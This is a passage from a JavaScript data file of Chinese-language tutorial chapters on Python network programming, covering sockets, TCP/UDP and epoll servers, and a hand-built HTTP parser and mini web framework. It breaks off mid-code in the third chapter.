export const chapters = [
  {
    id: "pyb-3-1",
    group: "Python网络编程",
    icon: "🔌",
    title: "Socket编程基础",
    content: `# Socket编程基础

## 一、Socket概述

### 1.1 什么是Socket

Socket（套接字）是计算机网络中用于不同主机间进程通信的一种抽象层，它是操作系统提供的用于网络通信的编程接口（API）。可以将Socket理解为网络通信的"插座"，通过它，不同计算机上的进程可以发送和接收数据。

**Socket的本质：**
- Socket是对TCP/IP协议栈的封装，提供了应用层与传输层之间的接口
- 每个Socket由IP地址+端口号唯一标识，形成通信的端点
- Socket可以实现不同主机间进程的双向通信

### 1.2 Socket的发展历史

| 时间 | 事件 | 说明 |
|------|------|------|
| 1983年 | Socket诞生 | 由加州大学伯克利分校在BSD 4.2 Unix中首次实现，称为Berkeley Socket |
| 1986年 | AT&T引入STREAMS | 在System V Unix中实现，提供了另一种网络编程接口 |
| 1990年代 | Windows Sockets (Winsock) | 微软在Windows平台上实现的Socket API |
| 现代 | 跨平台标准化 | POSIX Socket成为业界标准，被所有主流操作系统支持 |

## 二、Socket类型

### 2.1 流式Socket (SOCK_STREAM)

流式Socket基于TCP协议，提供面向连接、可靠的数据传输服务：

- **面向连接**：通信前必须先建立连接（三次握手）
- **可靠传输**：保证数据不丢失、不重复、按序到达
- **字节流**：数据以字节流形式传输，无消息边界
- **流量控制**：发送方不会发送超过接收方处理能力的数据
- **拥塞控制**：根据网络状况调整发送速率

**适用场景**：HTTP/HTTPS、FTP、SMTP、SSH等需要可靠传输的应用

### 2.2 数据报Socket (SOCK_DGRAM)

数据报Socket基于UDP协议，提供无连接、不可靠的数据传输服务：

- **无连接**：通信前不需要建立连接，直接发送数据
- **不可靠传输**：不保证数据一定到达、不保证顺序、可能重复
- **数据报**：每个数据包独立传输，有消息边界
- **高效**：传输开销小，延迟低
- **支持广播和组播**：可以一对多发送数据

**适用场景**：DNS查询、视频直播、在线游戏、实时通信等对实时性要求高但允许少量丢包的场景

### 2.3 原始Socket (SOCK_RAW)

原始Socket允许直接访问IP层，可以自定义IP头部，通常用于：
- 网络嗅探和抓包
- 实现自定义协议
- 网络攻击和防御
- 路由协议实现

## 三、TCP Socket编程基础

### 3.1 TCP Socket通信流程

TCP客户端-服务器通信的完整流程如下：

| 步骤 | 服务器端 | 客户端 | 说明 |
|------|---------|--------|------|
| 1 | socket() | socket() | 创建套接字 |
| 2 | bind() | - | 服务器绑定IP和端口 |
| 3 | listen() | - | 服务器开始监听 |
| 4 | accept() | connect() | 客户端发起连接，服务器接受连接 |
| 5 | recv()/send() | send()/recv() | 数据传输 |
| 6 | close() | close() | 关闭连接 |

### 3.2 Python socket模块API详解

Python通过标准库\`socket\`模块提供Socket编程接口：

\`\`\`python
import socket

# 创建TCP socket
# 参数：地址族(AF_INET=IPv4, AF_INET6=IPv6, AF_UNIX=Unix域)
#       Socket类型(SOCK_STREAM=TCP, SOCK_DGRAM=UDP)
#       协议号(通常为0，表示自动选择)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)

# 绑定地址和端口（服务器端）
# 参数：(host, port)元组，host为空字符串表示绑定所有网卡
sock.bind(('0.0.0.0', 8080))

# 开始监听（服务器端）
# 参数：backlog，未完成连接队列的最大长度
sock.listen(128)

# 接受连接（服务器端，阻塞）
# 返回值：(新的socket对象, 客户端地址元组)
client_sock, client_addr = sock.accept()

# 发起连接（客户端）
# 参数：服务器地址元组
sock.connect(('127.0.0.1', 8080))

# 发送数据
# 参数：bytes类型数据
# 返回值：实际发送的字节数
bytes_sent = sock.send(b'Hello, World!')

# 发送完整数据（内部循环处理，确保所有数据都发送）
sock.sendall(b'Hello, World!')

# 接收数据
# 参数：bufsize，一次最多接收的字节数
# 返回值：接收到的bytes数据，空字节串表示连接已关闭
data = sock.recv(4096)

# 关闭socket
sock.close()
\`\`\`

### 3.3 简单TCP服务器实现

\`\`\`python
import socket

def main():
    # 创建TCP socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # 设置SO_REUSEADDR选项，允许端口快速重用
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    # 绑定到所有网卡的8080端口
    server_socket.bind(('0.0.0.0', 8080))
    
    # 开始监听，backlog设为128
    server_socket.listen(128)
    print('TCP服务器启动，监听端口8080...')
    
    while True:
        # 等待客户端连接（阻塞）
        client_socket, client_addr = server_socket.accept()
        print(f'客户端 {client_addr} 已连接')
        
        try:
            while True:
                # 接收数据（最多1024字节）
                data = client_socket.recv(1024)
                if not data:
                    # 接收到空数据，表示客户端已关闭连接
                    break
                
                print(f'收到来自 {client_addr} 的数据: {data.decode("utf-8")}')
                
                # 回显数据
                response = f'服务器已收到: {data.decode("utf-8")}'.encode('utf-8')
                client_socket.sendall(response)
        
        except Exception as e:
            print(f'与客户端 {client_addr} 通信出错: {e}')
        
        finally:
            # 关闭客户端连接
            client_socket.close()
            print(f'客户端 {client_addr} 已断开')

if __name__ == '__main__':
    main()
\`\`\`

### 3.4 简单TCP客户端实现

\`\`\`python
import socket

def main():
    # 创建TCP socket
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        # 连接到服务器
        client_socket.connect(('127.0.0.1', 8080))
        print('已连接到服务器')
        
        while True:
            # 从用户输入获取消息
            message = input('请输入消息(输入quit退出): ')
            if message.lower() == 'quit':
                break
            
            # 发送数据
            client_socket.sendall(message.encode('utf-8'))
            
            # 接收响应
            response = client_socket.recv(4096)
            print(f'服务器响应: {response.decode("utf-8")}')
    
    except ConnectionRefusedError:
        print('连接被拒绝，请确保服务器已启动')
    except Exception as e:
        print(f'出错: {e}')
    
    finally:
        client_socket.close()
        print('已断开连接')

if __name__ == '__main__':
    main()
\`\`\`

## 四、UDP Socket编程基础

### 4.1 UDP Socket通信流程

UDP是无连接协议，通信流程比TCP简单：

| 步骤 | 服务器端 | 客户端 |
|------|---------|--------|
| 1 | socket() | socket() |
| 2 | bind() | - |
| 3 | recvfrom()/sendto() | sendto()/recvfrom() |
| 4 | close() | close() |

### 4.2 UDP Socket API

\`\`\`python
import socket

# 创建UDP socket
udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# 绑定地址（服务器端）
udp_sock.bind(('0.0.0.0', 8080))

# 发送UDP数据
# 参数：数据(bytes)，目标地址元组
udp_sock.sendto(b'Hello UDP', ('127.0.0.1', 8080))

# 接收UDP数据
# 参数：bufsize
# 返回值：(数据bytes, 发送方地址元组)
data, addr = udp_sock.recvfrom(4096)
\`\`\`

### 4.3 UDP服务器示例

\`\`\`python
import socket

def main():
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_socket.bind(('0.0.0.0', 8080))
    print('UDP服务器启动，监听端口8080...')
    
    while True:
        # 接收数据和客户端地址
        data, client_addr = udp_socket.recvfrom(4096)
        print(f'收到来自 {client_addr} 的UDP数据: {data.decode("utf-8")}')
        
        # 发送响应
        response = f'UDP服务器已收到: {data.decode("utf-8")}'.encode('utf-8')
        udp_socket.sendto(response, client_addr)

if __name__ == '__main__':
    main()
\`\`\`

## 五、阻塞与非阻塞IO

### 5.1 阻塞IO模型

默认情况下，Socket是阻塞模式的：
- \`accept()\`、\`connect()\`、\`recv()\`、\`send()\`等调用会阻塞当前线程，直到操作完成
- 优点：编程简单，逻辑清晰
- 缺点：一个线程同时只能处理一个连接，效率低

### 5.2 非阻塞IO模型

可以将Socket设置为非阻塞模式：

\`\`\`python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setblocking(False)  # 设置为非阻塞模式

# 非阻塞模式下调用accept()/recv()等，如果没有数据会立即抛出BlockingIOError
# 需要配合循环或IO多路复用使用
try:
    client_sock, addr = sock.accept()
except BlockingIOError:
    # 没有连接到来
    pass
\`\`\`

### 5.3 设置超时

可以给Socket操作设置超时时间：

\`\`\`python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(5.0)  # 设置超时为5秒

try:
    sock.connect(('127.0.0.1', 8080))
    data = sock.recv(4096)
except socket.timeout:
    print('连接或接收超时')
\`\`\`

## 六、Socket常用选项

通过\`setsockopt()\`方法可以设置Socket选项：

| 选项级别 | 选项名 | 说明 |
|---------|-------|------|
| SOL_SOCKET | SO_REUSEADDR | 允许重用本地地址，解决TIME_WAIT状态下端口无法绑定问题 |
| SOL_SOCKET | SO_REUSEPORT | 允许多个Socket绑定到同一端口（内核负载均衡） |
| SOL_SOCKET | SO_KEEPALIVE | 开启TCP心跳检测 |
| SOL_SOCKET | SO_RCVBUF | 接收缓冲区大小 |
| SOL_SOCKET | SO_SNDBUF | 发送缓冲区大小 |
| SOL_SOCKET | SO_BROADCAST | 允许发送广播数据（UDP） |
| IPPROTO_TCP | TCP_NODELAY | 禁用Nagle算法，立即发送小数据包 |

使用示例：

\`\`\`python
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 允许端口重用
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# 禁用Nagle算法
sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

# 设置发送缓冲区为64KB
sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)

# 开启TCP Keepalive
sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
# TCP Keepalive参数（Linux特有）
sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)   # 首次探测前空闲时间（秒）
sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)  # 探测间隔（秒）
sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 3)     # 探测次数
\`\`\`

## 七、常见坑点

### 坑点1：粘包问题
TCP是字节流协议，没有消息边界，多次\`send()\`的数据可能被合并接收，或者一次\`send()\`的数据被拆分多次接收。解决方案：
- 固定消息长度
- 使用特殊分隔符
- 消息头+消息体格式（头部包含消息长度）

### 坑点2：send()返回值问题
\`send()\`不保证所有数据都发送出去，返回实际发送的字节数。需要使用循环或\`sendall()\`确保全部发送。

### 坑点3：TIME_WAIT状态
服务器主动关闭连接后，端口会处于TIME_WAIT状态一段时间（通常2MSL），此时无法重新绑定该端口。设置\`SO_REUSEADDR\`选项可以解决。

### 坑点4：忘记处理recv()返回空
当对方关闭连接时，\`recv()\`会返回空字节串\`b''\`，必须检查这种情况，否则会导致无限循环。

## 八、面试常见问题

**Q: TCP和UDP的区别？**
A: TCP面向连接、可靠、字节流、有流量控制和拥塞控制；UDP无连接、不可靠、数据报、高效但可能丢包。TCP用于可靠传输场景，UDP用于实时性要求高的场景。

**Q: 什么是粘包？如何解决？**
A: TCP粘包是因为字节流没有消息边界，多个包被合并或拆分。解决方法有固定长度、分隔符、长度前缀法（推荐）。

**Q: Socket编程中为什么要设置SO_REUSEADDR？**
A: 服务器重启时，如果有连接处于TIME_WAIT状态，绑定端口会失败。SO_REUSEADDR允许在TIME_WAIT状态下绑定端口，便于快速重启服务。

**Q: 为什么TCP需要三次握手？**
A: 三次握手确认双方的发送和接收能力都正常，防止已失效的连接请求报文段突然又传到服务器，导致错误建立连接。
`,
  },
  {
    id: "pyb-3-2",
    group: "Python网络编程",
    icon: "🔌",
    title: "TCP服务器实现",
    content: `# TCP服务器实现

## 一、TCP服务器模型演进

从简单到复杂，TCP服务器有多种实现模型，每种模型适用于不同的并发场景：

| 模型 | 特点 | 并发能力 | 复杂度 | 适用场景 |
|------|------|---------|--------|---------|
| 单进程循环服务器 | 一次只能处理一个连接 | 低 | 极低 | 学习测试、低并发 |
| 多进程服务器 | 每个连接一个进程 | 中 | 中 | CPU密集型服务 |
| 多线程服务器 | 每个连接一个线程 | 中高 | 中 | IO密集型服务 |
| IO多路复用服务器 | 单线程处理多个连接 | 高 | 高 | 高并发网络服务 |
| 异步IO服务器 | 事件驱动+协程 | 极高 | 极高 | 超高并发服务 |

## 二、单进程循环服务器

最简单的TCP服务器，按顺序处理连接，同一时间只能服务一个客户端：

\`\`\`python
import socket

def handle_client(client_sock, client_addr):
    """处理单个客户端"""
    print(f'[处理] 开始处理 {client_addr}')
    with client_sock:
        while True:
            data = client_sock.recv(4096)
            if not data:
                break
            response = f'Echo: {data.decode()}'.encode()
            client_sock.sendall(response)
    print(f'[处理] {client_addr} 处理完成')

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 8080))
    server.listen(128)
    print('单进程服务器启动，端口8080')
    
    while True:
        client_sock, client_addr = server.accept()
        handle_client(client_sock, client_addr)  # 阻塞处理

if __name__ == '__main__':
    main()
\`\`\`

**问题**：如果一个客户端连接后长时间不发送数据，服务器会被阻塞，其他客户端无法连接。

## 三、多进程服务器

使用\`os.fork()\`或\`multiprocessing\`模块，每个连接创建一个子进程处理：

\`\`\`python
import socket
import os
import signal

def handle_client(client_sock, client_addr):
    """子进程处理客户端"""
    with client_sock:
        while True:
            data = client_sock.recv(4096)
            if not data:
                break
            client_sock.sendall(f'[PID{os.getpid()}] Echo: {data.decode()}'.encode())
    print(f'子进程 {os.getpid()} 处理完成 {client_addr}')

def main():
    # 处理僵尸进程：忽略子进程退出信号
    signal.signal(signal.SIGCHLD, signal.SIG_IGN)
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 8080))
    server.listen(128)
    print(f'多进程服务器启动，PID={os.getpid()}，端口8080')
    
    while True:
        client_sock, client_addr = server.accept()
        print(f'新连接 {client_addr}')
        
        pid = os.fork()
        if pid == 0:
            # 子进程
            server.close()  # 子进程不需要监听socket
            handle_client(client_sock, client_addr)
            os._exit(0)  # 子进程退出
        else:
            # 父进程
            client_sock.close()  # 父进程不需要客户端socket

if __name__ == '__main__':
    main()
\`\`\`

**多进程优缺点：**
- ✅ 进程间隔离，稳定性高，一个进程崩溃不影响其他
- ✅ 可以利用多核CPU
- ❌ 进程创建开销大（fork需要复制页表等）
- ❌ 进程间通信复杂
- ❌ 能支持的并发数有限（受限于进程数，通常几百个）

## 四、多线程服务器

使用\`threading\`模块，每个连接创建一个线程处理：

\`\`\`python
import socket
import threading

def handle_client(client_sock, client_addr):
    """线程处理函数"""
    thread_id = threading.current_thread().name
    print(f'[{thread_id}] 开始处理 {client_addr}')
    with client_sock:
        while True:
            try:
                data = client_sock.recv(4096)
                if not data:
                    break
                client_sock.sendall(f'[{thread_id}] Echo: {data.decode()}'.encode())
            except Exception as e:
                print(f'[{thread_id}] 错误: {e}')
                break
    print(f'[{thread_id}] {client_addr} 处理完成')

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 8080))
    server.listen(128)
    print('多线程服务器启动，端口8080')
    
    thread_count = 0
    while True:
        client_sock, client_addr = server.accept()
        thread_count += 1
        t = threading.Thread(
            target=handle_client,
            args=(client_sock, client_addr),
            name=f'Worker-{thread_count}',
            daemon=True  # 设为守护线程，主线程退出时自动结束
        )
        t.start()
        print(f'当前活动线程数: {threading.active_count() - 1}')

if __name__ == '__main__':
    main()
\`\`\`

**多线程优缺点：**
- ✅ 线程创建开销比进程小
- ✅ 线程间通信简单（共享内存）
- ❌ Python GIL导致CPU密集型任务无法利用多核
- ❌ 存在线程安全问题（需要锁同步）
- ❌ 大量线程会消耗较多栈内存
- ❌ 线程切换有开销

## 五、IO多路复用

### 5.1 IO多路复用原理

IO多路复用（IO Multiplexing）允许单个线程同时监视多个文件描述符（Socket），当某个Socket就绪（可读/可写）时通知程序进行处理。这是高并发服务器的基础。

核心思想：不再为每个连接创建进程/线程，而是用一个线程同时管理大量连接。

### 5.2 select、poll、epoll对比

| 特性 | select | poll | epoll |
|------|--------|------|-------|
| 最大连接数 | 有上限（通常1024） | 无上限（受内存限制） | 无上限 |
| 查找就绪FD | O(n)遍历 | O(n)遍历 | O(1)回调通知 |
| 内存拷贝 | 每次调用拷贝FD集合 | 每次调用拷贝FD数组 | 共享内存，无需拷贝 |
| 工作模式 | LT（水平触发） | LT（水平触发） | LT/ET（边缘触发） |
| 平台兼容性 | 跨平台 | 跨平台 | 仅Linux |
| 性能（大量连接） | 差 | 一般 | 优秀 |

### 5.3 select实现服务器

\`\`\`python
import socket
import select

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 8080))
    server.listen(128)
    server.setblocking(False)  # 设置为非阻塞
    
    # 监视列表：初始包含服务器socket
    inputs = [server]
    outputs = []  # 需要写数据的socket
    # 存储每个socket的待发送数据
    msg_queue = {}
    
    print('select模型服务器启动，端口8080')
    
    while inputs:
        # select阻塞等待，直到有socket就绪
        # 参数：读列表、写列表、异常列表、超时时间
        readable, writable, exceptional = select.select(inputs, outputs, inputs)
        
        for sock in readable:
            if sock is server:
                # 服务器socket可读：有新连接
                client_sock, client_addr = sock.accept()
                print(f'新连接: {client_addr}')
                client_sock.setblocking(False)
                inputs.append(client_sock)
                msg_queue[client_sock] = []
            else:
                # 客户端socket可读：有数据到来
                data = sock.recv(4096)
                if data:
                    print(f'收到数据: {data.decode()} from {sock.getpeername()}')
                    msg_queue[sock].append(data)
                    if sock not in outputs:
                        outputs.append(sock)
                else:
                    # 客户端关闭连接
                    print(f'连接关闭: {sock.getpeername()}')
                    if sock in outputs:
                        outputs.remove(sock)
                    inputs.remove(sock)
                    sock.close()
                    del msg_queue[sock]
        
        for sock in writable:
            # 客户端socket可写：发送数据
            if msg_queue[sock]:
                data = msg_queue[sock].pop(0)
                sent = sock.send(data)
                # 如果没发完，把剩余数据放回去
                if sent < len(data):
                    msg_queue[sock].insert(0, data[sent:])
            if not msg_queue[sock]:
                outputs.remove(sock)
        
        for sock in exceptional:
            # 异常情况
            print(f'异常: {sock.getpeername()}')
            inputs.remove(sock)
            if sock in outputs:
                outputs.remove(sock)
            sock.close()
            del msg_queue[sock]

if __name__ == '__main__':
    main()
\`\`\`

### 5.4 epoll实现服务器（Linux）

epoll是Linux特有的高性能IO多路复用机制：

\`\`\`python
import socket
import select

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 8080))
    server.listen(128)
    server.setblocking(False)
    
    # 创建epoll对象
    # EPOLLIN：可读；EPOLLOUT：可写；EPOLLET：边缘触发
    epoll = select.epoll()
    epoll.register(server.fileno(), select.EPOLLIN)
    
    fd_to_socket = {server.fileno(): server}
    msg_queue = {}
    
    print('epoll模型服务器启动，端口8080')
    
    try:
        while True:
            # 等待事件（阻塞）
            events = epoll.poll(timeout=-1, maxevents=-1)
            
            for fd, event in events:
                sock = fd_to_socket[fd]
                
                if sock is server:
                    # 新连接
                    client_sock, client_addr = sock.accept()
                    print(f'新连接: {client_addr}')
                    client_sock.setblocking(False)
                    epoll.register(client_sock.fileno(), select.EPOLLIN)
                    fd_to_socket[client_sock.fileno()] = client_sock
                    msg_queue[client_sock.fileno()] = []
                
                elif event & select.EPOLLIN:
                    # 可读事件
                    data = sock.recv(4096)
                    if data:
                        print(f'收到数据: {data.decode()}')
                        msg_queue[fd].append(data)
                        # 修改监听事件为可写
                        epoll.modify(fd, select.EPOLLOUT)
                    else:
                        # 连接关闭
                        print(f'连接关闭: {sock.getpeername()}')
                        epoll.unregister(fd)
                        sock.close()
                        del fd_to_socket[fd]
                        del msg_queue[fd]
                
                elif event & select.EPOLLOUT:
                    # 可写事件
                    if msg_queue[fd]:
                        data = msg_queue[fd].pop(0)
                        sent = sock.send(data)
                        if sent < len(data):
                            msg_queue[fd].insert(0, data[sent:])
                    if not msg_queue[fd]:
                        # 数据发完，改回监听可读
                        epoll.modify(fd, select.EPOLLIN)
                
                elif event & (select.EPOLLERR | select.EPOLLHUP):
                    # 异常或挂断
                    print(f'异常: {sock.getpeername()}')
                    epoll.unregister(fd)
                    sock.close()
                    del fd_to_socket[fd]
                    del msg_queue[fd]
    finally:
        epoll.close()
        server.close()

if __name__ == '__main__':
    main()
\`\`\`

### 5.5 水平触发(LT) vs 边缘触发(ET)

| 模式 | 触发条件 | 特点 | 编程要求 |
|------|---------|------|---------|
| LT（水平触发） | 只要缓冲区有数据就会一直通知 | 不容易丢数据，编程简单 | recv后不用循环读完 |
| ET（边缘触发） | 只有数据到来的瞬间通知一次 | 性能更高，减少epoll_wait调用次数 | 必须用非阻塞IO+循环读直到返回EAGAIN |

## 六、Reactor反应堆模式

epoll等IO多路复用是基础，工业级服务器通常使用Reactor设计模式：

- **Reactor**：负责监听和分发事件，对应epoll_wait循环
- **Handler**：处理不同类型的事件（连接、读、写）
- **核心思想**：事件驱动，将IO事件注册到Reactor，事件发生时回调对应的Handler

## 七、常见坑点

### 坑点1：忘记处理EAGAIN/EWOULDBLOCK
在非阻塞模式下，recv/send可能返回EAGAIN错误（errno=11），这不是真正的错误，只是表示"现在不可用，请稍后再试"，必须正确处理。

### 坑点2：epoll ET模式没读完数据
ET模式只通知一次，如果没把数据读完，剩余数据要等新数据到来才会再次通知，导致数据"卡住"。ET模式必须循环读直到返回EAGAIN。

### 坑点3：多进程/多线程资源泄露
要记得关闭不使用的socket（父进程关闭客户端socket，子进程关闭监听socket），否则文件描述符泄露。

### 坑点4：僵尸进程
多进程服务器如果不处理SIGCHLD信号，子进程退出后会变成僵尸进程，占用PID资源。设置\`signal(SIGCHLD, SIG_IGN)\`或wait/waitpid回收。

## 八、面试常见问题

**Q: select/poll/epoll的区别？**
A: select/poll每次遍历所有文件描述符，O(n)复杂度，有FD数量限制(select)；epoll基于回调，O(1)复杂度，无FD数量限制，支持ET模式，性能更高。

**Q: 什么是Reactor模式？**
A: Reactor是事件驱动的设计模式，核心是一个事件循环，监听IO事件并分发给对应的处理器处理，是高并发服务器的基础架构。

**Q: 多线程和IO多路复用如何选择？**
A: 连接数少（<1000）时多线程编程简单；连接数多（>1000）时IO多路复用性能更好，开销更小。实际生产中常用IO多路复用+线程池组合。

**Q: epoll为什么高效？**
A: 1）基于红黑树存储FD，增删改查O(log n)；2）使用回调机制，只有活跃FD才会被通知，不用遍历全部；3）内核和用户空间共享内存，减少数据拷贝。
`,
  },
  {
    id: "pyb-3-3",
    group: "Python网络编程",
    icon: "🔌",
    title: "HTTP协议原生实现",
    content: `# HTTP协议原生实现

## 一、目标与意义

在本章中，我们将使用Python原生的socket模块从零实现一个HTTP服务器，不依赖任何Web框架（Flask/Django/FastAPI等）。这样做的意义在于：

1. **深入理解HTTP协议本质**：看清请求响应的真实字节流
2. **理解Web框架原理**：知道Flask/Django这些框架在底层做了什么
3. **提升网络编程能力**：掌握Socket编程、协议解析的核心技能
4. **培养从零构建系统的思维**：从底层理解复杂系统如何分层构建

## 二、HTTP请求解析

### 2.1 HTTP请求的原始格式

一个完整的HTTP请求在TCP字节流中看起来是这样的：

\`\`\`
GET /index.html?name=test HTTP/1.1\r\n
Host: localhost:8080\r\n
User-Agent: curl/7.79.1\r\n
Accept: */*\r\n
Content-Type: application/json\r\n
Content-Length: 18\r\n
\r\n
{"key": "value"}
\`\`\`

**关键观察：**
- 每一行以\`\\r\\n\`（CRLF）结尾
- 请求行与头部之间、头部与正文之间用\`\\r\\n\\r\\n\`分隔
- 请求方法+路径+协议版本在第一行
- 头部是Key: Value格式
- Body可选，长度由Content-Length指定

### 2.2 逐步解析HTTP请求

我们需要写一个解析器，把接收到的字节流解析成结构化的请求对象：

\`\`\`python
from typing import Dict, Optional, Tuple

class HTTPRequest:
    """HTTP请求对象"""
    def __init__(self):
        self.method: str = ''          # 请求方法 GET/POST/...
        self.path: str = ''            # 请求路径
        self.query: Dict[str, str] = {} # 查询参数
        self.version: str = ''         # HTTP版本
        self.headers: Dict[str, str] = {}  # 请求头
        self.body: bytes = b''         # 请求体

def parse_http_request(data: bytes) -> Tuple[Optional[HTTPRequest], int]:
    """
    解析HTTP请求
    返回值: (请求对象或None, 已解析的字节数)
    如果请求不完整，返回(None, 0)
    """
    request = HTTPRequest()
    
    # 查找头部结束标记 \\r\\n\\r\\n
    header_end = data.find(b'\\r\\n\\r\\n')
    if header_end == -1:
        # 头部还没接收完整
        return None, 0
    
    # 分离头部和body的起始部分
    header_bytes = data[:header_end]
    header_str = header_bytes.decode('latin-1')
    lines = header_str.split('\\r\\n')
    
    if not lines:
        return None, 0
    
    # 1. 解析请求行: GET /path?query HTTP/1.1
    request_line = lines[0]
    parts = request_line.split(' ')
    if len(parts) != 3:
        return None, 0  # 无效请求行
    
    request.method = parts[0].upper()
    request.version = parts[2]
    
    # 解析路径和查询参数
    path = parts[1]
    if '?' in path:
        path, query_str = path.split('?', 1)
        request.path = path
        for pair in query_str.split('&'):
            if '=' in pair:
                k, v = pair.split('=', 1)
                request.query[k] = v
            else:
                request.query[pair] = ''
    else:
        request.path = path
    
    # 2. 解析请求头
    for line in lines[1:]:
        if ':' in line:
            key, value = line.split(':', 1)
            request.headers[key.strip().lower()] = value.strip()
    
    # 3. 解析请求体
    content_length = int(request.headers.get('content-length', '0'))
    body_start = header_end + 4  # 跳过 \\r\\n\\r\\n
    
    if len(data) < body_start + content_length:
        # body还没接收完整
        return None, 0
    
    request.body = data[body_start : body_start + content_length]
    parsed_len = body_start + content_length
    
    return request, parsed_len
\`\`\`

## 三、构造HTTP响应

### 3.1 HTTP响应格式

\`\`\`
HTTP/1.1 200 OK\r\n
Content-Type: text/html; charset=utf-8\r\n
Content-Length: 13\r\n
Connection: close\r\n
\r\n
Hello, World!
\`\`\`

### 3.2 响应构造器

\`\`\`python
import json
from typing import Dict, Optional, Any

class HTTPResponse:
    """HTTP响应对象"""
    
    # 状态码文本映射
    STATUS_TEXT = {
        200: 'OK',
        201: 'Created',
        301: 'Moved Permanently',
        302: 'Found',
        400: 'Bad Request',
        401: 'Unauthorized',
        403: 'Forbidden',
        404: 'Not Found',
        405: 'Method Not Allowed',
        500: 'Internal Server Error',
        502: 'Bad Gateway',
        503: 'Service Unavailable',
    }
    
    def __init__(
        self,
        body: Any = b'',
        status: int = 200,
        headers: Optional[Dict[str, str]] = None,
        content_type: str = 'text/html; charset=utf-8'
    ):
        self.status = status
        self.headers = headers if headers else {}
        
        # 处理body
        if isinstance(body, str):
            self.body = body.encode('utf-8')
        elif isinstance(body, dict) or isinstance(body, list):
            self.body = json.dumps(body, ensure_ascii=False).encode('utf-8')
            content_type = 'application/json; charset=utf-8'
        elif isinstance(body, bytes):
            self.body = body
        else:
            self.body = str(body).encode('utf-8')
        
        # 设置必要的头部
        self.headers['Content-Type'] = content_type
        self.headers['Content-Length'] = str(len(self.body))
        self.headers.setdefault('Connection', 'close')
        self.headers.setdefault('Server', 'PyHTTP/0.1')
    
    def to_bytes(self) -> bytes:
        """将响应序列化为字节流"""
        status_text = self.STATUS_TEXT.get(self.status, 'Unknown')
        
        # 状态行
        lines = [f'HTTP/1.1 {self.status} {status_text}']
        
        # 响应头
        for key, value in self.headers.items():
            lines.append(f'{key}: {value}')
        
        # 空行 + body
        response_str = '\\r\\n'.join(lines) + '\\r\\n\\r\\n'
        return response_str.encode('latin-1') + self.body
\`\`\`

## 四、微型Web框架实现

现在我们把请求解析和响应构造组合起来，实现一个支持路由的微型框架：

\`\`\`python
import socket
import select
import traceback
from typing import Callable, Dict, List, Optional
from urllib.parse import unquote

class MiniWeb:
    """微型Web框架，类似Flask的核心功能"""
    
    def __init__(self):
        self.routes: Dict[str, Dict[str, Callable]] = {}  # {path: {method: handler}}
        self.middlewares: List[Callable] = []
        self.static_dir: Optional[str] = None
    
    def route(self, path: str, methods: List[str] = None):
        """路由装饰器"""
        if methods is None:
            methods = ['GET']
        
        def decorator(func: Callable):
            if path not in self.routes:
                self.routes[path] = {}
            for method in methods:
                self.routes[path][method.upper()] = func
            return func
        return decorator
    
    def get(self, path: str):
        return self.route(path, ['GET'])
    
    def post(self, path: str):
        return self.route(path, ['POST'])
    
    def add_middleware(self, middleware: Callable):
        self.middlewares.append(middleware)
    
    def handle_request(self, request: HTTPRequest) -> HTTPResponse:
        """处理单个请求，返回响应"""
        # URL解码
        request.path = unquote(request.path)
        
        # 中间件处理
        for mw in self.middlewares:
            result = mw(request)
            if isinstance(result, HTTPResponse):
                return result
        
        # 路由匹配
        if request.path in self.routes:
            method_handlers = self.routes[request.path]
            if request.method in method_handlers:
                try:
                    handler = method_handlers[request.method]
                    return handler(request)
                except Exception as e:
                    error_body = f'500 Internal Server Error\\n{traceback.format_exc()}'
                    return HTTPResponse(error_body, status=500, content_type='text/plain')
            else:
                return HTTPResponse('405 Method Not Allowed', status=405)
        else:
            return HTTPResponse('404 Not Found', status=404, content_type='text/plain')
    
    def run(self, host: str = '0.0.0.0', port: int = 8080):
        """启动服务器"""
        server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_sock.bind((host, port))
        server_sock.listen(128)
        server_sock.setblocking(False)
        
        epoll = select.epoll()
        epoll.register(server_sock.fileno(), select.EPOLLIN)
        
        fd_to_sock = {server_sock.fileno(): server_sock}
        buffers = {}  # {fd: 已接收但未解析的数据}
        
        print(f'服务器启动在 http://{host}:{port}')
        
        try:
            while True:
                events = epoll.poll(timeout=1)
                
                for fd, event in events:
                    sock = fd_to_sock[fd]
                    
                    if sock is server_sock:
                        client_sock, addr = sock.accept()
                        client_sock.setblocking(False)
